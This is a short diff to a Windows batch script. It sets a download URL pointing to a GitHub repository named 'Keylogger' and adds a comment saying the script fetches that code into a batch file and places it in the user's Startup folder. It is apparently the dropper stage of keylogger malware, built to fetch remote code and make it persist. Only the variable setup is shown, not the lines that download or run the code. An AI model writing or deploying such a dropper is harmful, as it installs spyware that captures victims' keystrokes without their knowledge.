@@ -1,6 +1,6 @@
 @echo off
-
-set url=YOUR_GITHUB_RAW_URL
+REM You can add your own if you like, this just downloads it and puts it into a batch file and then puts it in the startup folder
+set url=https://raw.githubusercontent.com/iMakeStuff69420/Keylogger/main/Script
 set outputFile=script.bat
 set vbsScript=run.vbs
 set startupFolder="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
